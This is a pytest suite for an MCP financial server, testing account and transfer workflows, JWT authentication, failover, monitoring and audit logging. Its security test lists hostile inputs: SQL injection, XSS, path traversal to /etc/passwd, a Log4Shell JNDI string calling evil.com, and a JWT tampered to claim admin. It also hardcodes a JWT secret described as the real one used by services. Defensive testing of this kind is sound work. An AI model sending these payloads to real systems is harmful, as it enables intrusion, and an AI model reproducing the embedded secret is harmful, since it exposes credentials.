"""
System validation and integration tests for MCP Financial Server.
Tests end-to-end integration with real financial services.
"""

import pytest
import asyncio
import json
import httpx
import time
from datetime import datetime, timedelta
from decimal import Decimal
from unittest.mock import AsyncMock, MagicMock, patch
from typing import Dict, Any, List

from mcp_financial.server import FinancialMCPServer
from mcp_financial.auth.jwt_handler import JWTAuthHandler, UserContext
from mcp_financial.clients.account_client import AccountServiceClient
from mcp_financial.clients.transaction_client import TransactionServiceClient


class TestSystemValidation:
    """Comprehensive system validation tests."""
    
    @pytest.fixture
    async def system_server(self):
        """Create server for system validation testing."""
        with patch('mcp_financial.server.Settings') as mock_settings_class:
            mock_settings = MagicMock()
            mock_settings.account_service_url = "http://localhost:8080"
            mock_settings.transaction_service_url = "http://localhost:8081"
            mock_settings.jwt_secret = "AY8Ro0HSBFyllm9ZPafT2GWuE/t8Yzq1P0Rf7bNeq14="
            mock_settings.server_timeout = 5000
            mock_settings_class.return_value = mock_settings
            
            server = FinancialMCPServer()
            yield server
    
    @pytest.fixture
    def real_jwt_handler(self):
        """Create JWT handler with real secret used by services."""
        return JWTAuthHandler("AY8Ro0HSBFyllm9ZPafT2GWuE/t8Yzq1P0Rf7bNeq14=")
    
    @pytest.fixture
    def admin_user_context(self):
        """Admin user context for testing."""
        return UserContext(
            user_id="admin_001",
            username="system_admin",
            roles=["admin"],
            permissions=[
                "account:create", "account:read", "account:update", "account:delete",
                "transaction:create", "transaction:read", "transaction:reverse",
                "account:balance:update", "admin:system:status"
            ]
        )
    
    @pytest.fixture
    def financial_officer_context(self):
        """Financial officer context for testing."""
        return UserContext(
            user_id="fo_001",
            username="financial_officer",
            roles=["financial_officer"],
            permissions=[
                "account:create", "account:read", "account:update",
                "transaction:create", "transaction:read", "transaction:reverse",
                "account:balance:update"
            ]
        )
    
    @pytest.fixture
    def customer_context(self):
        """Customer context for testing."""
        return UserContext(
            user_id="customer_001",
            username="john_customer",
            roles=["customer"],
            permissions=["account:read", "transaction:read", "transaction:create"]
        )

    @pytest.mark.asyncio
    async def test_end_to_end_financial_workflow(self, system_server, real_jwt_handler, admin_user_context):
        """Test complete end-to-end financial workflow with real service integration."""
        # Create real JWT token
        admin_token = real_jwt_handler.create_token(
            user_id=admin_user_context.user_id,
            username=admin_user_context.username,
            roles=admin_user_context.roles,
            permissions=admin_user_context.permissions,
            expires_in=3600
        )
        
        # Mock service responses for complete workflow
        with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = admin_user_context
            
            # Step 1: Create customer account
            with patch.object(system_server.account_client, 'create_account', new_callable=AsyncMock) as mock_create:
                mock_create.return_value = {
                    "id": "acc_e2e_123",
                    "ownerId": "customer_e2e_001",
                    "accountType": "CHECKING",
                    "balance": 0.0,
                    "status": "ACTIVE",
                    "createdAt": "2024-01-01T10:00:00Z"
                }
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_create_account', return_value=True):
                    create_result = await system_server.account_tools.create_account(
                        "customer_e2e_001", "CHECKING", 0.0, f"Bearer {admin_token}"
                    )
                
                create_data = json.loads(create_result[0].text)
                assert create_data["success"] is True
                account_id = create_data["data"]["id"]
            
            # Step 2: Initial deposit
            with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get, \
                 patch.object(system_server.transaction_client, 'deposit_funds', new_callable=AsyncMock) as mock_deposit:
                
                mock_get.return_value = {"id": account_id, "ownerId": "customer_e2e_001", "status": "ACTIVE"}
                mock_deposit.return_value = {
                    "id": "txn_e2e_001",
                    "accountId": account_id,
                    "amount": 5000.0,
                    "transactionType": "DEPOSIT",
                    "status": "COMPLETED",
                    "createdAt": "2024-01-01T10:05:00Z"
                }
                
                with patch('mcp_financial.tools.transaction_tools.PermissionChecker.can_access_account', return_value=True):
                    deposit_result = await system_server.transaction_tools.deposit_funds(
                        account_id, 5000.0, "Initial deposit", f"Bearer {admin_token}"
                    )
                
                deposit_data = json.loads(deposit_result[0].text)
                assert deposit_data["success"] is True
                assert deposit_data["data"]["amount"] == 5000.0
            
            # Step 3: Create second account for transfer
            with patch.object(system_server.account_client, 'create_account', new_callable=AsyncMock) as mock_create2:
                mock_create2.return_value = {
                    "id": "acc_e2e_456",
                    "ownerId": "customer_e2e_002",
                    "accountType": "SAVINGS",
                    "balance": 0.0,
                    "status": "ACTIVE"
                }
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_create_account', return_value=True):
                    create2_result = await system_server.account_tools.create_account(
                        "customer_e2e_002", "SAVINGS", 0.0, f"Bearer {admin_token}"
                    )
                
                create2_data = json.loads(create2_result[0].text)
                dest_account_id = create2_data["data"]["id"]
            
            # Step 4: Transfer between accounts
            with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get_both, \
                 patch.object(system_server.account_client, 'get_account_balance', new_callable=AsyncMock) as mock_balance, \
                 patch.object(system_server.transaction_client, 'transfer_funds', new_callable=AsyncMock) as mock_transfer:
                
                mock_get_both.side_effect = [
                    {"id": account_id, "ownerId": "customer_e2e_001", "status": "ACTIVE"},
                    {"id": dest_account_id, "ownerId": "customer_e2e_002", "status": "ACTIVE"}
                ]
                
                mock_balance.return_value = {
                    "accountId": account_id,
                    "balance": 5000.0,
                    "availableBalance": 5000.0
                }
                
                mock_transfer.return_value = {
                    "id": "txn_e2e_transfer_001",
                    "fromAccountId": account_id,
                    "toAccountId": dest_account_id,
                    "amount": 1500.0,
                    "transactionType": "TRANSFER",
                    "status": "COMPLETED"
                }
                
                with patch('mcp_financial.tools.transaction_tools.PermissionChecker.can_access_account', return_value=True):
                    transfer_result = await system_server.transaction_tools.transfer_funds(
                        account_id, dest_account_id, 1500.0, "Transfer to savings", f"Bearer {admin_token}"
                    )
                
                transfer_data = json.loads(transfer_result[0].text)
                assert transfer_data["success"] is True
                assert transfer_data["data"]["amount"] == 1500.0
            
            # Step 5: Query transaction history
            with patch.object(system_server.transaction_client, 'get_transaction_history', new_callable=AsyncMock) as mock_history:
                mock_history.return_value = {
                    "content": [
                        {
                            "id": "txn_e2e_001",
                            "accountId": account_id,
                            "amount": 5000.0,
                            "transactionType": "DEPOSIT",
                            "createdAt": "2024-01-01T10:05:00Z"
                        },
                        {
                            "id": "txn_e2e_transfer_001",
                            "accountId": account_id,
                            "amount": -1500.0,
                            "transactionType": "TRANSFER",
                            "createdAt": "2024-01-01T10:10:00Z"
                        }
                    ],
                    "totalElements": 2
                }
                
                with patch('mcp_financial.tools.query_tools.PermissionChecker.can_access_account', return_value=True):
                    history_result = await system_server.query_tools.get_transaction_history(
                        account_id, 0, 20, None, None, f"Bearer {admin_token}"
                    )
                
                history_data = json.loads(history_result[0].text)
                assert history_data["success"] is True
                assert len(history_data["data"]["content"]) == 2

    @pytest.mark.asyncio
    async def test_jwt_authentication_flow_validation(self, system_server, real_jwt_handler):
        """Test JWT authentication flow across all services."""
        # Test 1: Valid token with appropriate permissions
        valid_token = real_jwt_handler.create_token(
            user_id="test_user_001",
            username="test_user",
            roles=["customer"],
            permissions=["account:read", "transaction:read"],
            expires_in=3600
        )
        
        with patch.object(system_server.auth_handler, 'validate_token') as mock_validate:
            mock_validate.return_value = {
                'sub': 'test_user_001',
                'username': 'test_user',
                'roles': ['customer'],
                'permissions': ['account:read', 'transaction:read'],
                'iat': int(time.time()),
                'exp': int(time.time()) + 3600
            }
            
            user_context = system_server.auth_handler.extract_user_context(f"Bearer {valid_token}")
            
            assert user_context.user_id == "test_user_001"
            assert user_context.username == "test_user"
            assert "customer" in user_context.roles
            assert "account:read" in user_context.permissions
        
        # Test 2: Expired token
        expired_token = real_jwt_handler.create_token(
            user_id="test_user_002",
            username="expired_user",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=-3600  # Expired 1 hour ago
        )
        
        from mcp_financial.auth.jwt_handler import AuthenticationError
        with pytest.raises(AuthenticationError, match="Token has expired"):
            real_jwt_handler.validate_token(expired_token)
        
        # Test 3: Invalid signature
        invalid_handler = JWTAuthHandler("wrong-secret-key")
        with pytest.raises(AuthenticationError, match="Invalid token"):
            invalid_handler.validate_token(valid_token)
        
        # Test 4: Malformed token
        with pytest.raises(AuthenticationError, match="Invalid token"):
            real_jwt_handler.validate_token("invalid.token.format")

    @pytest.mark.asyncio
    async def test_mcp_client_integration_scenarios(self, system_server):
        """Test MCP client integration scenarios."""
        # Test 1: MCP protocol initialization
        init_response = {
            "protocolVersion": "2024-11-05",
            "capabilities": {
                "tools": {"listChanged": True}
            },
            "serverInfo": {
                "name": "financial-mcp-server",
                "version": "1.0.0"
            }
        }
        
        with patch.object(system_server.app, 'initialize', new_callable=AsyncMock) as mock_init:
            mock_init.return_value = init_response
            
            # Simulate client initialization
            from mcp.types import InitializeRequest
            init_request = InitializeRequest(
                protocolVersion="2024-11-05",
                capabilities={"tools": {}},
                clientInfo={"name": "kiro-ide", "version": "1.0.0"}
            )
            
            response = await system_server.app.initialize(init_request)
            assert response["protocolVersion"] == "2024-11-05"
            assert "financial-mcp-server" in response["serverInfo"]["name"]
        
        # Test 2: Tool discovery
        expected_tools = [
            {
                "name": "create_account",
                "description": "Create a new financial account",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "owner_id": {"type": "string"},
                        "account_type": {"type": "string"},
                        "initial_balance": {"type": "number"},
                        "auth_token": {"type": "string"}
                    },
                    "required": ["owner_id", "account_type", "auth_token"]
                }
            }
        ]
        
        with patch.object(system_server.app, 'list_tools', new_callable=AsyncMock) as mock_list:
            mock_list.return_value = {"tools": expected_tools}
            
            from mcp.types import ListToolsRequest
            tools_response = await system_server.app.list_tools(ListToolsRequest())
            
            assert "tools" in tools_response
            assert len(tools_response["tools"]) >= 1
            assert any(tool["name"] == "create_account" for tool in tools_response["tools"])
        
        # Test 3: Concurrent tool execution
        with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = UserContext(
                user_id="concurrent_user",
                username="concurrent_test",
                roles=["customer"],
                permissions=["account:read", "transaction:read"]
            )
            
            # Mock multiple tool responses
            with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get1, \
                 patch.object(system_server.transaction_client, 'get_transaction_history', new_callable=AsyncMock) as mock_get2:
                
                mock_get1.return_value = {"id": "acc_concurrent_1", "balance": 1000.0}
                mock_get2.return_value = {"content": [], "totalElements": 0}
                
                # Execute concurrent operations
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True), \
                     patch('mcp_financial.tools.query_tools.PermissionChecker.can_access_account', return_value=True):
                    
                    tasks = [
                        system_server.account_tools.get_account("acc_concurrent_1", "Bearer token"),
                        system_server.query_tools.get_transaction_history("acc_concurrent_1", 0, 10, None, None, "Bearer token")
                    ]
                    
                    results = await asyncio.gather(*tasks)
                    
                    assert len(results) == 2
                    for result in results:
                        data = json.loads(result[0].text)
                        assert data["success"] is True

    @pytest.mark.asyncio
    async def test_security_validation_and_vulnerability_assessment(self, system_server, real_jwt_handler):
        """Test security measures and vulnerability assessment."""
        # Test 1: SQL Injection attempts
        malicious_inputs = [
            "'; DROP TABLE accounts; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = UserContext(
                user_id="security_test",
                username="security_user",
                roles=["customer"],
                permissions=["account:read"]
            )
            
            for malicious_input in malicious_inputs:
                with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                    # Should handle malicious input gracefully
                    mock_get.side_effect = Exception("Invalid input detected")
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await system_server.account_tools.get_account(malicious_input, "Bearer token")
                    
                    data = json.loads(result[0].text)
                    assert data["success"] is False
                    assert "error" in data
        
        # Test 2: Authorization bypass attempts
        unauthorized_user = UserContext(
            user_id="unauthorized_user",
            username="hacker",
            roles=["customer"],
            permissions=["account:read"]  # Limited permissions
        )
        
        with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = unauthorized_user
            
            # Attempt privileged operation (should fail)
            with patch('mcp_financial.tools.account_tools.PermissionChecker.has_permission', return_value=False):
                result = await system_server.account_tools.update_account_balance(
                    "acc_123", 10000.0, "Unauthorized balance update", "Bearer token"
                )
            
            data = json.loads(result[0].text)
            assert data["success"] is False
            assert "permission" in data["error_message"].lower()
        
        # Test 3: Rate limiting simulation
        rate_limit_requests = []
        for i in range(10):  # Simulate rapid requests
            with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                mock_get.return_value = {"id": f"acc_{i}", "balance": 1000.0}
                
                with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
                    mock_auth.return_value = UserContext(
                        user_id="rate_limit_user",
                        username="rapid_user",
                        roles=["customer"],
                        permissions=["account:read"]
                    )
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await system_server.account_tools.get_account(f"acc_{i}", "Bearer token")
                    
                    rate_limit_requests.append(result)
        
        # All requests should complete (rate limiting would be handled at infrastructure level)
        assert len(rate_limit_requests) == 10
        
        # Test 4: Token manipulation attempts
        valid_token = real_jwt_handler.create_token(
            user_id="token_test_user",
            username="token_user",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=3600
        )
        
        # Attempt to modify token payload
        token_parts = valid_token.split('.')
        if len(token_parts) == 3:
            # Modify the payload (should fail validation)
            import base64
            try:
                payload = json.loads(base64.urlsafe_b64decode(token_parts[1] + '=='))
                payload['roles'] = ['admin']  # Escalate privileges
                modified_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                modified_token = f"{token_parts[0]}.{modified_payload}.{token_parts[2]}"
                
                from mcp_financial.auth.jwt_handler import AuthenticationError
                with pytest.raises(AuthenticationError):
                    real_jwt_handler.validate_token(modified_token)
            except Exception:
                # Token modification should fail
                pass

    @pytest.mark.asyncio
    async def test_monitoring_and_alerting_integration(self, system_server):
        """Test monitoring and alerting integration."""
        # Test 1: Health check endpoints
        with patch.object(system_server.account_client, 'health_check', new_callable=AsyncMock) as mock_health1, \
             patch.object(system_server.transaction_client, 'health_check', new_callable=AsyncMock) as mock_health2:
            
            mock_health1.return_value = True
            mock_health2.return_value = True
            
            # Test system health check
            health_status = {
                "status": "healthy",
                "services": {
                    "account_service": await system_server.account_client.health_check(),
                    "transaction_service": await system_server.transaction_client.health_check()
                },
                "timestamp": datetime.utcnow().isoformat()
            }
            
            assert health_status["status"] == "healthy"
            assert health_status["services"]["account_service"] is True
            assert health_status["services"]["transaction_service"] is True
        
        # Test 2: Metrics collection
        metrics_data = {
            "mcp_requests_total": 150,
            "mcp_request_duration_avg": 0.25,
            "service_requests_total": 300,
            "circuit_breaker_open_count": 0,
            "active_connections": 5
        }
        
        # Simulate metrics collection
        with patch('mcp_financial.utils.metrics.get_metrics') as mock_metrics:
            mock_metrics.return_value = metrics_data
            
            collected_metrics = mock_metrics()
            
            assert collected_metrics["mcp_requests_total"] > 0
            assert collected_metrics["mcp_request_duration_avg"] < 1.0
            assert collected_metrics["circuit_breaker_open_count"] == 0
        
        # Test 3: Error alerting
        error_scenarios = [
            {"type": "service_unavailable", "service": "account_service"},
            {"type": "authentication_failure", "user": "test_user"},
            {"type": "circuit_breaker_open", "service": "transaction_service"},
            {"type": "high_error_rate", "rate": 0.15}
        ]
        
        alerts_triggered = []
        
        for scenario in error_scenarios:
            # Simulate alert triggering
            alert = {
                "timestamp": datetime.utcnow().isoformat(),
                "severity": "warning" if scenario["type"] != "service_unavailable" else "critical",
                "message": f"Alert: {scenario['type']}",
                "details": scenario
            }
            alerts_triggered.append(alert)
        
        assert len(alerts_triggered) == 4
        assert any(alert["severity"] == "critical" for alert in alerts_triggered)
        
        # Test 4: Performance monitoring
        performance_metrics = {
            "avg_response_time": 0.15,
            "p95_response_time": 0.45,
            "p99_response_time": 0.85,
            "throughput_rps": 125.5,
            "error_rate": 0.02,
            "memory_usage_mb": 256,
            "cpu_usage_percent": 35.2
        }
        
        # Validate performance thresholds
        assert performance_metrics["avg_response_time"] < 0.5  # Under 500ms average
        assert performance_metrics["p95_response_time"] < 1.0  # Under 1s for 95th percentile
        assert performance_metrics["error_rate"] < 0.05  # Under 5% error rate
        assert performance_metrics["cpu_usage_percent"] < 80  # Under 80% CPU usage

    @pytest.mark.asyncio
    async def test_disaster_recovery_scenarios(self, system_server):
        """Test disaster recovery and failover scenarios."""
        # Test 1: Account Service failure
        with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
            mock_get.side_effect = httpx.ConnectError("Account service unavailable")
            
            with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="disaster_test",
                    username="disaster_user",
                    roles=["customer"],
                    permissions=["account:read"]
                )
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                    result = await system_server.account_tools.get_account("acc_123", "Bearer token")
                
                data = json.loads(result[0].text)
                assert data["success"] is False
                assert "service" in data["error_message"].lower()
        
        # Test 2: Database connection failure
        with patch.object(system_server.transaction_client, 'get_transaction_history', new_callable=AsyncMock) as mock_history:
            mock_history.side_effect = Exception("Database connection failed")
            
            with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="disaster_test",
                    username="disaster_user",
                    roles=["customer"],
                    permissions=["transaction:read"]
                )
                
                with patch('mcp_financial.tools.query_tools.PermissionChecker.can_access_account', return_value=True):
                    result = await system_server.query_tools.get_transaction_history(
                        "acc_123", 0, 10, None, None, "Bearer token"
                    )
                
                data = json.loads(result[0].text)
                assert data["success"] is False
        
        # Test 3: Circuit breaker activation
        with patch.object(system_server.account_client, 'circuit_breaker') as mock_cb:
            mock_cb.state = "OPEN"
            mock_cb.is_open = True
            
            from mcp_financial.clients.base_client import CircuitBreakerError
            with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                mock_get.side_effect = CircuitBreakerError("Circuit breaker is open")
                
                with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
                    mock_auth.return_value = UserContext(
                        user_id="cb_test",
                        username="cb_user",
                        roles=["customer"],
                        permissions=["account:read"]
                    )
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await system_server.account_tools.get_account("acc_123", "Bearer token")
                    
                    data = json.loads(result[0].text)
                    assert data["success"] is False
                    assert "circuit breaker" in data["error_message"].lower()

    @pytest.mark.asyncio
    async def test_data_consistency_validation(self, system_server):
        """Test data consistency across services."""
        # Test 1: Account balance consistency after transactions
        account_id = "acc_consistency_123"
        initial_balance = 1000.0
        
        with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = UserContext(
                user_id="consistency_user",
                username="consistency_test",
                roles=["customer"],
                permissions=["account:read", "transaction:create"]
            )
            
            # Mock initial balance
            with patch.object(system_server.account_client, 'get_account_balance', new_callable=AsyncMock) as mock_balance:
                mock_balance.return_value = {
                    "accountId": account_id,
                    "balance": initial_balance,
                    "availableBalance": initial_balance
                }
                
                # Mock transaction
                with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get, \
                     patch.object(system_server.transaction_client, 'deposit_funds', new_callable=AsyncMock) as mock_deposit:
                    
                    mock_get.return_value = {"id": account_id, "ownerId": "consistency_user", "status": "ACTIVE"}
                    mock_deposit.return_value = {
                        "id": "txn_consistency_001",
                        "accountId": account_id,
                        "amount": 500.0,
                        "transactionType": "DEPOSIT",
                        "status": "COMPLETED"
                    }
                    
                    # Execute deposit
                    with patch('mcp_financial.tools.transaction_tools.PermissionChecker.can_access_account', return_value=True):
                        deposit_result = await system_server.transaction_tools.deposit_funds(
                            account_id, 500.0, "Consistency test deposit", "Bearer token"
                        )
                    
                    # Verify transaction completed
                    deposit_data = json.loads(deposit_result[0].text)
                    assert deposit_data["success"] is True
                    
                    # Mock updated balance
                    mock_balance.return_value = {
                        "accountId": account_id,
                        "balance": initial_balance + 500.0,
                        "availableBalance": initial_balance + 500.0
                    }
                    
                    # Verify balance consistency
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        balance_result = await system_server.account_tools.get_account_balance(
                            account_id, "Bearer token"
                        )
                    
                    balance_data = json.loads(balance_result[0].text)
                    assert balance_data["success"] is True
                    assert balance_data["data"]["balance"] == initial_balance + 500.0

    @pytest.mark.asyncio
    async def test_compliance_and_audit_validation(self, system_server):
        """Test compliance and audit trail validation."""
        audit_events = []
        
        def capture_audit_event(event_type, user_id, resource_id, action, details=None):
            audit_events.append({
                "event_type": event_type,
                "user_id": user_id,
                "resource_id": resource_id,
                "action": action,
                "details": details,
                "timestamp": datetime.utcnow().isoformat()
            })
        
        with patch('mcp_financial.utils.logging.log_audit_event', side_effect=capture_audit_event):
            with patch.object(system_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="audit_user_001",
                    username="audit_test",
                    roles=["financial_officer"],
                    permissions=["account:create", "transaction:create", "transaction:reverse"]
                )
                
                # Test auditable operations
                operations = [
                    ("account_creation", "acc_audit_001"),
                    ("transaction_creation", "txn_audit_001"),
                    ("transaction_reversal", "txn_audit_002")
                ]
                
                for operation_type, resource_id in operations:
                    if operation_type == "account_creation":
                        with patch.object(system_server.account_client, 'create_account', new_callable=AsyncMock) as mock_create:
                            mock_create.return_value = {
                                "id": resource_id,
                                "ownerId": "audit_customer",
                                "accountType": "CHECKING",
                                "balance": 0.0
                            }
                            
                            with patch('mcp_financial.tools.account_tools.PermissionChecker.can_create_account', return_value=True):
                                await system_server.account_tools.create_account(
                                    "audit_customer", "CHECKING", 0.0, "Bearer token"
                                )
                    
                    elif operation_type == "transaction_creation":
                        with patch.object(system_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get, \
                             patch.object(system_server.transaction_client, 'deposit_funds', new_callable=AsyncMock) as mock_deposit:
                            
                            mock_get.return_value = {"id": "acc_audit_001", "ownerId": "audit_customer", "status": "ACTIVE"}
                            mock_deposit.return_value = {
                                "id": resource_id,
                                "accountId": "acc_audit_001",
                                "amount": 1000.0,
                                "transactionType": "DEPOSIT"
                            }
                            
                            with patch('mcp_financial.tools.transaction_tools.PermissionChecker.can_access_account', return_value=True):
                                await system_server.transaction_tools.deposit_funds(
                                    "acc_audit_001", 1000.0, "Audit test deposit", "Bearer token"
                                )
                    
                    elif operation_type == "transaction_reversal":
                        with patch.object(system_server.transaction_client, 'reverse_transaction', new_callable=AsyncMock) as mock_reverse:
                            mock_reverse.return_value = {
                                "id": resource_id,
                                "originalTransactionId": "txn_audit_001",
                                "amount": -1000.0,
                                "transactionType": "REVERSAL"
                            }
                            
                            with patch('mcp_financial.tools.transaction_tools.PermissionChecker.has_permission', return_value=True):
                                await system_server.transaction_tools.reverse_transaction(
                                    "txn_audit_001", "Audit test reversal", "Bearer token"
                                )
                
                # Verify audit trail
                assert len(audit_events) >= len(operations)
                
                # Verify audit event structure
                for event in audit_events:
                    assert "event_type" in event
                    assert "user_id" in event
                    assert "resource_id" in event
                    assert "action" in event
                    assert "timestamp" in event
                    assert event["user_id"] == "audit_user_001"